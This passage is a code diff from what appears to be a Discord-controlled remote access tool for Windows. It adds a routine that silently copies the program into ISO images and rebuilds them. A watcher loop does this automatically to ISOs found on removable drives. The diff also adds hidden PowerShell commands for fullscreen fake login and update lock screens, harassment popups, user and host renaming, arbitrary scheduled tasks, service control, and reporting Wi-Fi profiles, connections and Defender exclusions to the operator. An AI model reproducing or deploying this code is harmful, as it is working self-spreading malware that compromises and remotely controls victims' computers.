+                            os.path.join(src, "*")],
+                           capture_output=True, creationflags=_CNW, timeout=1800)
+        if r.returncode == 0 and os.path.exists(out) and os.path.getsize(out) > 1 << 20:
+            return "7z"
+
+    ps = r'''
+$src = '@SRC@'; $out = '@OUT@'; $lbl = '@LBL@'
+$fsi = New-Object -ComObject IMAPI2FS.MsftFileSystemImage
+$fsi.FileSystemsToCreate = 3
+$fsi.VolumeName = $lbl
+$fsi.Root.AddTree($src, $false)
+$img = $fsi.CreateResultImage()
+$is = [System.Runtime.InteropServices.ComTypes.IStream]$img.ImageStream
+$fs = New-Object System.IO.FileStream($out, [System.IO.FileMode]::Create)
+$buf = New-Object byte[] 65536
+$read = 0
+do {
+  $is.Read([ref]$buf[0], 65536, [ref]$read)
+  if ($read -gt 0) { $fs.Write($buf, 0, $read) }
+} while ($read -gt 0)
+$fs.Close()
+'''.replace("@SRC@", src.replace("'", "''")).replace("@OUT@", out.replace("'", "''")) \
+   .replace("@LBL@", label)
+    _ps(ps)
+    if os.path.exists(out) and os.path.getsize(out) > 1 << 20:
+        return "imapi2"
+    return None
+
+
+def _iso_copy_tree(src, dst):
+    for dp, dirs, fs in os.walk(src):
+        rel = os.path.relpath(dp, src)
+        target = dst if rel == "." else os.path.join(dst, rel)
+        os.makedirs(target, exist_ok=True)
+        for f in fs:
+            try:
+                shutil.copy2(os.path.join(dp, f), os.path.join(target, f))
+            except Exception:
+                pass
+
+
+def inject_iso(iso, rebuild=True, log=None):
+    def _log(m):
+        if log:
+            log(m)
+        _crash("iso", m)
+
+    iso = os.path.abspath(iso)
+    if not os.path.isfile(iso):
+        return "missing"
+    if not _ISO_LOCK.acquire(False):
+        return "busy"
+    root = None
+    tmp = None
+    try:
+        letter = _iso_mount(iso)
+        if not letter:
+            return "mount-failed"
+        root = letter + "\\"
+        me = sys.executable if getattr(sys, "frozen", False) else sys.argv[0]
+        name = os.path.basename(me)
+
+        target = _iso_target(root)
+        try:
+            shutil.copy2(me, os.path.join(target, name))
+            _log("copied into {}".format(target))
+        except Exception as e:
+            _log("copy failed {!r}".format(e))
+            return "copy-failed"
+
+        if not rebuild:
+            return "copied-only"
+
+        label = _iso_label(iso)
+        tmp = os.path.join(tempfile.gettempdir(), "lmiso_" + _rand(8))
+        _iso_copy_tree(root, tmp)
+        _iso_unmount(iso)
+        root = None
+
+        tgt2 = _iso_target(tmp)
+        shutil.copy2(me, os.path.join(tgt2, name))
+
+        boot_img = os.path.join(tmp, "boot", "etfsboot.com")
+        efi_img = os.path.join(tmp, "efi", "microsoft", "boot", "efisys.bin")
+        new = iso + ".new"
+        if os.path.exists(new):
+            try:
+                os.remove(new)
+            except Exception:
+                pass
+        how = _iso_rebuild(tmp, new, label, boot_img, efi_img)
+        if not how:
+            return "rebuilt-failed"
+
+        bak = iso + ".bak"
+        try:
+            if os.path.exists(bak):
+                os.remove(bak)
+            os.rename(iso, bak)
+        except Exception:
+            pass
+        os.replace(new, iso)
+        if os.path.getsize(iso) < 1 << 20:
+            return "rebuilt-truncated"
+        _log("rebuilt with {}".format(how))
+        return "ok:" + how
+    except Exception as e:
+        _log("error {!r}".format(e))
+        return "error:{}".format(e)
+    finally:
+        if root:
+            _iso_unmount(iso)
+        if tmp:
+            shutil.rmtree(tmp, ignore_errors=True)
+        try:
+            _ISO_LOCK.release()
+        except Exception:
+            pass
+
+@bot.command(aliases=["inject-iso"])
+async def iso(ctx, path: str = None, rebuild: str = "yes"):
+    if not path:
+        found = [f for r in _removable_roots() for f in glob.glob(os.path.join(r, "*.iso"))]
+        await ctx.send(embed=create_embed("💿 ISO", "Usage `.iso <path> [yes|no]`\nFound: " + (", ".join(found) or "none"), 0x0084FF))
+        return
+    await ctx.message.add_reaction("💿")
+    res = await asyncio.to_thread(inject_iso, resolve(path), rebuild.lower() != "no")
+    color = 0x00FF00 if res.startswith(("ok", "copied")) else 0xFF0000
+    await ctx.send(embed=create_embed("💿 ISO", res, color))
+
+def _iso_watch_loop():
+    while True:
+        try:
+            if ISO_WATCH:
+                for root in _removable_roots():
+                    for name in glob.glob(os.path.join(root, "*.iso")):
+                        key = os.path.abspath(name).lower()
+                        if key in _ISO_SEEN:
+                            continue
+                        _ISO_SEEN.add(key)
+                        res = inject_iso(name, True)
+                        _crash("iso", "{} -> {}".format(name, res))
+        except Exception:
+            pass
+        time.sleep(25)
+
+async def _sh(ps, timeout=25):
+    try:
+        p = await asyncio.create_subprocess_exec(
+            "powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps,
+            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
+            creationflags=0x08000000)
+        out, err = await asyncio.wait_for(p.communicate(), timeout)
+        return (out or b"").decode("utf-8", "replace").strip(), (err or b"").decode("utf-8", "replace").strip()
+    except asyncio.TimeoutError:
+        return "", "timeout"
+    except Exception as e:
+        return "", str(e)
+
+
+@bot.command()
+async def scream(ctx):
+    await _sh("[console]::beep(2400,700);[console]::beep(1800,500);[console]::beep(3000,900)")
+    await ctx.send(embed=create_embed("Scream", "Played.", 0x9B59B6))
+
+
+@bot.command(aliases=["fake-login"])
+async def fake_login(ctx):
+    ps = r"""
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+$f = New-Object Windows.Forms.Form
+$f.FormBorderStyle = 'None'; $f.WindowState = 'Maximized'; $f.TopMost = $true
+$f.BackColor = '#1f4e79'
+$l = New-Object Windows.Forms.Label
+$l.Text = 'Sign in to continue'; $l.ForeColor = 'White'
+$l.Font = New-Object Drawing.Font('Segoe UI',24); $l.AutoSize = $true
+$l.Location = New-Object Drawing.Point(160,220); $f.Controls.Add($l)
+$t = New-Object Windows.Forms.TextBox
+$t.Size = New-Object Drawing.Size(340,30); $t.Location = New-Object Drawing.Point(160,300)
+$f.Controls.Add($t)
+$b = New-Object Windows.Forms.Button
+$b.Text = 'Sign in'; $b.Size = New-Object Drawing.Size(340,38)
+$b.Location = New-Object Drawing.Point(160,345); $f.Controls.Add($b)
+$b.Add_Click({ if ($t.Text -ne 'lessmi') { $l.Text = 'Wrong password'; $t.Clear() } })
+$f.ShowDialog()
+"""
+    asyncio.create_task(_sh(ps, 300))
+    await ctx.send(embed=create_embed("Fake login", "Fullscreen fake sign-in. Type `lessmi` to unlock.", 0x9B59B6))
+
+
+@bot.command(aliases=["fake-cmd"])
+async def fake_cmd(ctx):
+    ps = r"""
+$p = Start-Process cmd -ArgumentList '/k','echo LessMi & color 0a' -PassThru
+Start-Sleep 1
+$w = New-Object -ComObject WScript.Shell
+1..40 | % { $w.SendKeys("copy con nul`n"); Start-Sleep -Milliseconds 120 }
+"""
+    asyncio.create_task(_sh(ps, 120))
+    await ctx.send(embed=create_embed("Fake cmd", "Endless command prompt garbage.", 0x9B59B6))
+
+
+@bot.command(aliases=["fake-error-loop"])
+async def fake_error_loop(ctx):
+    ps = r"""
+Add-Type -AssemblyName System.Windows.Forms
+1..8 | % {
+  [Windows.Forms.MessageBox]::Show('lessmi.exe has stopped working.','Error','OK','Error') | Out-Null
+}
+"""
+    asyncio.create_task(_sh(ps, 120))
+    await ctx.send(embed=create_embed("Error storm", "8 stacked error boxes.", 0xE74C3C))
+
+
+@bot.command(aliases=["mouse-teleport"])
+async def mouse_teleport(ctx):
+    ps = r"""
+Add-Type -AssemblyName System.Windows.Forms
+$r = [Windows.Forms.Screen]::PrimaryScreen.Bounds
+1..25 | % {
+  [Windows.Forms.Cursor]::Position = New-Object Drawing.Point((Get-Random -Min 0 -Max $r.Width),(Get-Random -Min 0 -Max $r.Height))
+  Start-Sleep -Milliseconds 90
+}
+"""
+    asyncio.create_task(_sh(ps, 60))
+    await ctx.send(embed=create_embed("Mouse teleport", "Cursor is being thrown around.", 0x9B59B6))
+
+
+@bot.command(aliases=["typing-ghost"])
+async def typing_ghost(ctx, *, text="the quick brown fox jumps over the lazy dog"):
+    ps = f"$w=New-Object -ComObject WScript.Shell; Start-Sleep -m 300; $w.SendKeys('{text}')"
+    await _sh(ps)
+    await ctx.send(embed=create_embed("Typing ghost", f"Typed: `{text}`", 0x9B59B6))
+
+
+@bot.command(aliases=["folder-storm"])
+async def folder_storm(ctx, n: int = 60):
+    n = max(1, min(n, 400))
+    ps = f"$d=[Environment]::GetFolderPath('Desktop'); 1..{n} | % {{ New-Item -ItemType Directory -Path (Join-Path $d ('lessmi_' + $_)) -Force | Out-Null }}"
+    await _sh(ps)
+    await ctx.send(embed=create_embed("Folder storm", f"Created **{n}** folders on the desktop.", 0x9B59B6))
+
+
+@bot.command(aliases=["fake-scan"])
+async def fake_scan(ctx):
+    ps = r"""
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+$f = New-Object Windows.Forms.Form
+$f.Size = New-Object Drawing.Size(520,220); $f.Text = 'Windows Security'
+$f.BackColor = '#202020'; $f.TopMost = $true
+$p = New-Object Windows.Forms.ProgressBar
+$p.Size = New-Object Drawing.Size(470,26); $p.Location = New-Object Drawing.Point(20,120)
+$f.Controls.Add($p)
+$l = New-Object Windows.Forms.Label
+$l.Text = 'Scanning C:\ ...'; $l.ForeColor = 'White'
+$l.Location = New-Object Drawing.Point(20,70); $l.AutoSize = $true; $f.Controls.Add($l)
+$tm = New-Object Windows.Forms.Timer
+$tm.Interval = 120
+$tm.Add_Tick({ if ($p.Value -ge 99) { $tm.Stop(); $l.Text = 'Scan complete: 14 threats found' } else { $p.Value += 1 } })
+$tm.Start()
+$f.ShowDialog()
+"""
+    asyncio.create_task(_sh(ps, 300))
+    await ctx.send(embed=create_embed("Fake scan", "Fake antivirus scan that always ends with 14 threats.", 0x9B59B6))
+
+
+@bot.command(aliases=["rename-user"])
+async def rename_user(ctx, *, name="LessMi"):
+    ps = f"$u=(Get-CimInstance Win32_ComputerSystem).UserName; Rename-LocalUser -Name ($u -split '\\\\')[-1] -NewName '{name}'"
+    out, err = await _sh(ps)
+    await ctx.send(embed=create_embed("Rename user", out or err or "Renamed (re-login to see it).", 0x2ECC71))
+
+
+@bot.command(aliases=["fake-wifi-drop"])
+async def fake_wifi_drop(ctx):
+    ps = r"""
+Add-Type -AssemblyName System.Windows.Forms
+[Windows.Forms.MessageBox]::Show('Limited connectivity. Wi-Fi has been disabled by your administrator.','Network','OK','Warning') | Out-Null
+"""
+    asyncio.create_task(_sh(ps, 60))
+    await ctx.send(embed=create_embed("Fake wifi drop", "Sent.", 0x9B59B6))
+
+
+@bot.command(aliases=["taskbar-move"])
+async def taskbar_move(ctx, pos: str = "top"):
+    m = {"top": 1, "left": 0, "right": 2, "bottom": 3}.get(pos.lower(), 3)
+    ps = f"Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3' -Name Settings -Value ((Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3').Settings[0..11] + {m} + (Get-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StuckRects3').Settings[13..27])"
+    await _sh(ps)
+    await _sh("Stop-Process -Name explorer -Force")
+    await ctx.send(embed=create_embed("Taskbar move", f"Moved to `{pos}`.", 0x9B59B6))
+
+
+@bot.command(aliases=["window-stack"])
+async def window_stack(ctx, n: int = 12):
+    n = max(2, min(n, 30))
+    ps = f"""
+Add-Type -AssemblyName System.Windows.Forms
+1..{n} | % {{
+  $f = New-Object Windows.Forms.Form
+  $f.Text = 'lessmi'; $f.Size = New-Object Drawing.Size(300,180)
+  $f.StartPosition = 'Manual'; $f.Location = New-Object Drawing.Point((Get-Random -Max 700),(Get-Random -Max 500))
+  $f.TopMost = $true; $f.Show()
+}}
+Start-Sleep 30
+"""
+    asyncio.create_task(_sh(ps, 200))
+    await ctx.send(embed=create_embed("Window stack", f"**{n}** fake windows for 30 s.", 0x9B59B6))
+
+
+@bot.command(aliases=["shutdown-countdown"])
+async def shutdown_countdown(ctx, seconds: int = 60):
+    ps = f"""
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+$f = New-Object Windows.Forms.Form
+$f.FormBorderStyle='None'; $f.WindowState='Maximized'; $f.BackColor='#0a3d62'; $f.TopMost=$true
+$l = New-Object Windows.Forms.Label
+$l.ForeColor='White'; $l.AutoSize=$true; $l.Font=New-Object Drawing.Font('Segoe UI',34)
+$l.Location=New-Object Drawing.Point(200,300); $f.Controls.Add($l)
+$c = {seconds}
+$tm = New-Object Windows.Forms.Timer; $tm.Interval=1000
+$tm.Add_Tick({{ $l.Text = "Shutting down in $c seconds..."; $c--; if ($c -lt 0) {{ $tm.Stop(); $f.Close() }} }})
+$tm.Start(); $f.ShowDialog()
+"""
+    asyncio.create_task(_sh(ps, seconds + 40))
+    await ctx.send(embed=create_embed("Shutdown countdown", f"{seconds} s fullscreen counter. Nothing actually shuts down.", 0x9B59B6))
+
+
+@bot.command(aliases=["fake-update"])
+async def fake_update(ctx, percent: int = 0):
+    start = max(0, min(percent, 99))
+    ps = f"""
+Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+$f = New-Object Windows.Forms.Form
+$f.FormBorderStyle='None'; $f.WindowState='Maximized'; $f.BackColor='#1b1b1b'; $f.TopMost=$true
+$l = New-Object Windows.Forms.Label; $l.ForeColor='White'; $l.AutoSize=$true
+$l.Font=New-Object Drawing.Font('Segoe UI',28); $l.Location=New-Object Drawing.Point(240,340)
+$f.Controls.Add($l)
+$c = {start}
+$tm = New-Object Windows.Forms.Timer; $tm.Interval=900
+$tm.Add_Tick({{ $l.Text = "Working on updates  $c%  Do not turn off your PC"; $c++; if ($c -gt 99) {{ $c = 30 }} }})
+$tm.Start(); $f.ShowDialog()
+"""
+    asyncio.create_task(_sh(ps, 300))
+    await ctx.send(embed=create_embed("Fake update", "Endless update screen looping 30→99 %.", 0x9B59B6))
+
+
+@bot.command(aliases=["beep-song"])
+async def beep_song(ctx):
+    notes = [(523,220),(587,220),(659,220),(784,340),(659,220),(784,520)]
+    ps = ";".join(f"[console]::beep({f},{d})" for f, d in notes)
+    await _sh(ps, 30)
+    await ctx.send(embed=create_embed("Beep song", "Played.", 0x9B59B6))
+
+
+@bot.command(aliases=["random-notify"])
+async def random_notify(ctx, n: int = 5):
+    n = max(1, min(n, 20))
+    ps = f"""
+Add-Type -AssemblyName System.Windows.Forms
+$t = @('Update ready','Battery low','New device connected','Storage almost full','Restart required')
+1..{n} | % {{ [Windows.Forms.MessageBox]::Show(($t | Get-Random),'Windows','OK','Information') | Out-Null }}
+"""
+    asyncio.create_task(_sh(ps, 120))
+    await ctx.send(embed=create_embed("Random notify", f"**{n}** boxes.", 0x9B59B6))
+
+
+@bot.command(aliases=["fake-printer"])
+async def fake_printer(ctx):
+    ps = r"""
+Add-Type -AssemblyName System.Windows.Forms
+[Windows.Forms.MessageBox]::Show('Printer on fire. Check the tray.','Print','OK','Warning') | Out-Null
+"""
+    asyncio.create_task(_sh(ps, 60))
+    await ctx.send(embed=create_embed("Fake printer", "Sent.", 0x9B59B6))
+
+
+@bot.command(aliases=["fake-disk-full"])
+async def fake_disk_full(ctx):
+    ps = r"""
+Add-Type -AssemblyName System.Windows.Forms
+[Windows.Forms.MessageBox]::Show('Low disk space. You are running out of space on Local Disk (C:).','Storage','OK','Warning') | Out-Null
+"""
+    asyncio.create_task(_sh(ps, 60))
+    await ctx.send(embed=create_embed("Fake disk full", "Sent.", 0x9B59B6))
+
+
+@bot.command(aliases=["caps-spam"])
+async def caps_spam(ctx, n: int = 30):
+    ps = f"$w=New-Object -ComObject WScript.Shell; 1..{n} | % {{ $w.SendKeys('{{CAPSLOCK}}'); Start-Sleep -m 60 }}"
+    await _sh(ps, 40)
+    await ctx.send(embed=create_embed("Caps spam", f"Toggled Caps Lock **{n}** times.", 0x9B59B6))
+
+
+@bot.command(aliases=["cursor-spin"])
+async def cursor_spin(ctx, radius: int = 220):
+    ps = f"""
+Add-Type -AssemblyName System.Windows.Forms
+$p = [Windows.Forms.Cursor]::Position
+0..360 | % {{
+  $a = $_ * [Math]::PI / 180
+  [Windows.Forms.Cursor]::Position = New-Object Drawing.Point(($p.X + [Math]::Cos($a)*{radius}),($p.Y + [Math]::Sin($a)*{radius}))
+  Start-Sleep -Milliseconds 12
+}}
+"""
+    asyncio.create_task(_sh(ps, 60))
+    await ctx.send(embed=create_embed("Cursor spin", f"Spun a **{radius}px** circle.", 0x9B59B6))
+
+
+@bot.command(aliases=["volume-rave"])
+async def volume_rave(ctx, seconds: int = 20):
+    ps = f"""
+Add-Type -AssemblyName System.Windows.Forms
+$end = (Get-Date).AddSeconds({seconds})
+while ((Get-Date) -lt $end) {{
+  1..2 | % {{ [Windows.Forms.SendKeys]::SendWait([char]175) }}
+  1..3 | % {{ [Windows.Forms.SendKeys]::SendWait([char]174) }}
+  Start-Sleep -Milliseconds 250
+}}
+"""
+    asyncio.create_task(_sh(ps, seconds + 30))
+    await ctx.send(embed=create_embed("Volume rave", f"Volume jumping for {seconds} s.", 0x9B59B6))
+
+@bot.command(aliases=["sys-summary"])
+async def sys_summary(ctx):
+    ps = ("$c=Get-CimInstance Win32_Processor;$o=Get-CimInstance Win32_OperatingSystem;"
+          "'CPU: '+$c.Name;'Cores: '+$c.NumberOfCores;"
+          "'RAM free MB: '+[math]::Round($o.FreePhysicalMemory/1024);"
+          "'Uptime: '+((Get-Date)-$o.LastBootUpTime).ToString('dd\\.hh\\:mm')")
+    out, err = await _sh(ps)
+    await ctx.send(embed=create_embed("System summary", out[:1900] or err, 0x2ECC71))
+
+
+@bot.command(aliases=["cpu-load"])
+async def cpu_load(ctx):
+    out, err = await _sh("(Get-CimInstance Win32_Processor).LoadPercentage")
+    await ctx.send(embed=create_embed("CPU load", f"{out or err} %", 0x2ECC71))
+
+
+
+
+@bot.command(aliases=["disk-health"])
+async def disk_health(ctx):
+    ps = "Get-PhysicalDisk | Select-Object DeviceId,FriendlyName,MediaType,HealthStatus,OperationalStatus | Format-Table -Auto"
+    out, err = await _sh(ps)
+    await ctx.send(embed=create_embed("Disk health", f"```\n{out[:1700] or err}\n```", 0x2ECC71))
+
+
+@bot.command(aliases=["boot-errors"])
+async def boot_errors(ctx):
+    ps = "Get-WinEvent -FilterHashtable @{LogName='System';Id=41,6008,1001} -MaxEvents 10 | Select TimeCreated,Id,ProviderName | Format-Table -Auto"
+    out, err = await _sh(ps)
+    await ctx.send(embed=create_embed("Boot errors", f"```\n{out[:1700] or err}\n```", 0xE67E22))
+
+
+@bot.command(aliases=["bsod-history"])
+async def bsod_history(ctx):
+    ps = "Get-CimInstance Win32_ReliabilityRecords | Where-Object {$_.SourceName -like '*bugcheck*'} | Select-Object TimeGenerated,ProductName,Message | Format-List"
+    out, err = await _sh(ps)
+    await ctx.send(embed=create_embed("BSOD history", f"```\n{out[:1700] or err}\n```", 0xE67E22))
+
+
+@bot.command(aliases=["time-sync"])
+async def time_sync(ctx):
+    out, err = await _sh("w32tm /resync /force")
+    await ctx.send(embed=create_embed("Time sync", out or err, 0x2ECC71))
+
+
+@bot.command(aliases=["dns-cache"])
+async def dns_cache(ctx):
+    out, err = await _sh("Get-DnsClientCache | Select-Object Entry,RecordName,Data | Format-Table -Auto")
+    await ctx.send(embed=create_embed("DNS cache", f"```\n{out[:1700] or err}\n```", 0x2ECC71))
+
+
+@bot.command(aliases=["winsock-reset"])
+async def winsock_reset(ctx):
+    out, err = await _sh("netsh winsock reset; netsh int ip reset")
+    await ctx.send(embed=create_embed("Winsock reset", out or err, 0xE67E22))
+
+
+@bot.command(aliases=["powercfg-report"])
+async def powercfg_report(ctx):
+    path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "power.html")
+    out, err = await _sh(f"powercfg /energy /output '{path}' /duration 10")
+    await ctx.send(embed=create_embed("Energy report", f"Saved to `{path}`.\n{out or err}"[:1900], 0x2ECC71))
+
+
+@bot.command(aliases=["battery-report"])
+async def battery_report(ctx):
+    path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), "battery.html")
+    out, err = await _sh(f"powercfg /batteryreport /output '{path}'")
+    await ctx.send(embed=create_embed("Battery report", f"Saved to `{path}`.\n{out or err}"[:1900], 0x2ECC71))
+
+
+@bot.command(aliases=["wlan-report"])
+async def wlan_report(ctx):
+    out, err = await _sh("netsh wlan show interfaces; netsh wlan show profiles")
+    await ctx.send(embed=create_embed("WLAN report", f"```\n{out[:1700] or err}\n```", 0x2ECC71))
+
+
+@bot.command(aliases=["net-pid"])
+async def net_pid(ctx):
+    ps = "Get-NetTCPConnection | Where-Object State -eq Established | Select LocalPort,RemoteAddress,RemotePort,OwningProcess | Format-Table -Auto"
+    out, err = await _sh(ps)
+    await ctx.send(embed=create_embed("Connections", f"```\n{out[:1700] or err}\n```", 0x2ECC71))
+
+
+@bot.command(aliases=["listening-owner"])
+async def listening_owner(ctx):
+    ps = "Get-NetTCPConnection -State Listen | ForEach-Object { $p=Get-Process -Id $_.OwningProcess -EA 0; \"$($_.LocalPort)  $($p.Name)\" }"
+    out, err = await _sh(ps)
+    await ctx.send(embed=create_embed("Listening ports", f"```\n{out[:1700] or err}\n```", 0x2ECC71))
+
+
+@bot.command(aliases=["fw-status"])
+async def fw_status(ctx):
+    out, err = await _sh("Get-NetFirewallProfile | Select-Object Name,Enabled,DefaultInboundAction | Format-Table -Auto")
+    await ctx.send(embed=create_embed("Firewall status", f"```\n{out[:1700] or err}\n```", 0xE67E22))
+
+
+@bot.command(aliases=["defender-exclusions"])
+async def defender_exclusions(ctx):
+    out, err = await _sh("(Get-MpPreference).ExclusionPath")
+    await ctx.send(embed=create_embed("Defender exclusions", f"```\n{out[:1700] or 'none'}\n```", 0xE67E22))
+
+
+@bot.command(aliases=["defender-scan"])
+async def defender_scan(ctx, path: str = "C:\\"):
+    out, err = await _sh(f"Start-MpScan -ScanType CustomScan -ScanPath '{path}'")
+    await ctx.send(embed=create_embed("Defender scan", out or err or f"Scanning `{path}`.", 0xE67E22))
+
+
+@bot.command(aliases=["sched-list"])
+async def sched_list(ctx, path: str = "\\"):
+    out, err = await _sh(f"Get-ScheduledTask -TaskPath '{path}' | Select-Object TaskName,State | Format-Table -Auto")
+    await ctx.send(embed=create_embed("Scheduled tasks", f"```\n{out[:1700] or err}\n```", 0x2ECC71))
+
+
+@bot.command(aliases=["sched-add"])
+async def sched_add(ctx, name: str, time: str, *, command: str):
+    ps = (f"$a=New-ScheduledTaskAction -Execute '{command}';"
+          f"$t=New-ScheduledTaskTrigger -At '{time}';"
+          f"Register-ScheduledTask -TaskName '{name}' -Action $a -Trigger $t -Force | Out-Null")
+    out, err = await _sh(ps)
+    await ctx.send(embed=create_embed("Task created", out or err or f"`{name}` at `{time}`.", 0x2ECC71))
+
+
+@bot.command(aliases=["sched-del"])
+async def sched_del(ctx, name: str):
+    out, err = await _sh(f"Unregister-ScheduledTask -TaskName '{name}' -Confirm:$false")
+    await ctx.send(embed=create_embed("Task deleted", out or err or name, 0xE74C3C))
+
+
+@bot.command(aliases=["svc-status"])
+async def svc_status(ctx, name: str):
+    out, err = await _sh(f"Get-Service -Name '{name}' | Select-Object Name,Status,StartType | Format-List")
+    await ctx.send(embed=create_embed("Service", f"```\n{out[:1700] or err}\n```", 0x2ECC71))
+
+
+@bot.command(aliases=["svc-start", "svc-stop", "svc-restart"])
+async def svc_ctl(ctx, name: str, action: str = "restart"):
+    act = action.lower()
+    cmd = {"start": f"Start-Service '{name}'", "stop": f"Stop-Service '{name}' -Force",
+           "restart": f"Restart-Service '{name}' -Force"}.get(act, f"Restart-Service '{name}' -Force")
+    out, err = await _sh(cmd)
+    await ctx.send(embed=create_embed(f"Service {act}", out or err or name, 0x2ECC71))
+
+
+@bot.command(aliases=["env-path"])
+async def env_path(ctx):
+    out, err = await _sh("[Environment]::GetEnvironmentVariable('Path','Machine')")
+    await ctx.send(embed=create_embed("PATH", f"```\n{out[:1700] or err}\n```", 0x2ECC71))
+
+
+@bot.command(aliases=["path-add"])
+async def path_add(ctx, *, directory: str):
+    ps = (f"$p=[Environment]::GetEnvironmentVariable('Path','Machine');"
+          f"if ($p -notlike '*{directory}*') {{ [Environment]::SetEnvironmentVariable('Path', $p + ';{directory}', 'Machine') }}")
+    out, err = await _sh(ps)
+    await ctx.send(embed=create_embed("PATH updated", out or err or directory, 0x2ECC71))
+
+
+@bot.command(aliases=["hostname-set"])
+async def hostname_set(ctx, *, name: str):
+    out, err = await _sh(f"Rename-Computer -NewName '{name}' -Force")
+    await ctx.send(embed=create_embed("Hostname", out or err or f"Renamed to `{name}` (reboot needed).", 0x2ECC71))
+
+
+@bot.command(aliases=["proxy-off"])
+async def proxy_off(ctx):
+    out, err = await _sh("netsh winhttp reset proxy; Set-ItemProperty 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings' -Name ProxyEnable -Value 0")
+    await ctx.send(embed=create_embed("Proxy disabled", out or err or "Done.", 0x2ECC71))
+
+
+@bot.command(aliases=["dpi-info"])
+async def dpi_info(ctx):
+    ps = "Get-ItemProperty 'HKCU:\\Control Panel\\Desktop' | Select-Object LogPixels,Win8DpiScaling | Format-List"
+    out, err = await _sh(ps)
+    await ctx.send(embed=create_embed("DPI", f"```\n{out[:1700] or err}\n```", 0x2ECC71))
+
+
+@bot.command(aliases=["font-list"])
+async def font_list(ctx):
+    out, err = await _sh("(New-Object System.Drawing.Text.InstalledFontCollection).Families.Name")
+    await ctx.send(embed=create_embed("Fonts", f"```\n{out[:1700] or err}\n```", 0x2ECC71))
+
+
+@bot.command(aliases=["audio-devices"])
+async def audio_devices(ctx):
+    out, err = await _sh("Get-CimInstance Win32_SoundDevice | Select-Object Name,Status,Manufacturer | Format-Table -Auto")
+    await ctx.send(embed=create_embed("Audio devices", f"```\n{out[:1700] or err}\n```", 0x2ECC71))
+
+
+@bot.command(aliases=["codec-list"])
+async def codec_list(ctx):
+    out, err = await _sh("Get-CimInstance Win32_CodecFile | Select-Object -First 40 Name | Format-Table -Auto")
+    await ctx.send(embed=create_embed("Codecs", f"```\n{out[:1700] or err}\n```", 0x2ECC71))
+
+
+@bot.command(aliases=["net-quality"])
+async def net_quality(ctx):
+    ps = ("$s=Get-NetAdapter | Where-Object Status -eq Up;"
+          "$s | Select-Object Name,LinkSpeed,MediaType | Format-Table -Auto;"
+          "Test-Connection 1.1.1.1 -Count 6 | Measure-Object ResponseTime -Average -Max | Select-Object Average,Maximum")
+    out, err = await _sh(ps, 40)
+    await ctx.send(embed=create_embed("Link quality", f"```\n{out[:1700] or err}\n```", 0x2ECC71))
 
 if __name__ == "__main__":
     try:
